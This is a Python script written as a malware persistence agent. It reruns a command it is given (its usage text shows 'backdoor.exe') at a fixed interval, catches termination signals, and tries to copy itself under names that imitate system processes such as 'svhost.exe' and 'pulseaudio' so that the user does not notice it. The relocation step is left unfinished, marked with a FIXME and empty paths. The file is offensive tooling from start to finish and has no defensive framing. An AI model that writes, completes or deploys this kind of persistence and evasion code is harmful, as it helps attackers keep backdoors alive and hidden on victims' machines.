#!/usr/bin/env python
import os, sys
import signal
from time import sleep
from random import choice

LINUX_DISGUISE_PROCESS_NAMES = ['init2', 'login', 'dvfsd', 'ibus-dconf', 'pulseaudio', 'akonadi_control', 'udisksd']
WINDOWS_DISGUISE_PROCESS_NAMES = ['winmanager.exe', 'svhost.exe', 'wmi.exe', 'logon.exe']
DEFAULT_SLEEP_TIMER = 30


def get_arguments():
    if len(sys.argv) < 2:
        print("Use this script to create a tiny agent that will periodically rerun your cmd command "
              "with a specified sleep timer. In case the agent has been killed," 
              "it would rewrite itself before dying to a new place with a new filename to avoid detection from the user.")
        print("Usage: " + sys.argv[0] + " 30 " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
        print("Usage: " + sys.argv[0] + " " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
        sys.exit()
    sleep_timer = sys.argv[1]
    try:
        sleep_timer = int(sleep_timer)
        cmd = sys.argv[2]
    except:
        sleep_timer = DEFAULT_SLEEP_TIMER
        cmd = sys.argv[1]
    return sleep_timer, cmd


def handle_signal(signal_number, frame):
    print('Dodging SIGTERM signal from the kernel')
    print('Attempting to hide from the user view')
    disguise()
    exit(1)

def disguise():
    platform = sys.platform    
    if platform == 'linux':
        new_file_name = choice(LINUX_DISGUISE_PROCESS_NAMES)
    elif platform == 'windows':
        new_file_name = choice(WINDOWS_DISGUISE_PROCESS_NAMES)
    else:
        raise Exception(platform + " is not supported")
    print('Rewriting self to a new location')
    # FIXME: implement the logic
    system_temp_folder = ''
    new_agent_file_name = ''
    
    disguised_agent_path = system_temp_folder + new_agent_file_name
    print('Starting a new disguised agent: ' + disguised_agent_path)
    os.system(disguised_agent_path)

def work_forever(cmd, sleep_timer_in_seconds):
    while True:
        print('Running ' + cmd)
        try:
            os.system(cmd)
        except:
            print("Command execution failed: " + cmd)
        print('Sleeping for ' + str(sleep_timer_in_seconds) + ' seconds')
        sleep(sleep_timer_in_seconds)


# 1 - OVERRIDE THE KERNEL SIGNAL HANDLER
signal.signal(signal.SIGTERM, handle_signal)

# 2 - START THE AGENT
sleep_timer, cmd = get_arguments()
try:
    work_forever(cmd, sleep_timer)
except:
    print('Unexpected error has been received') 
    print('Hiding and replicating self in a new location')
    disguise()
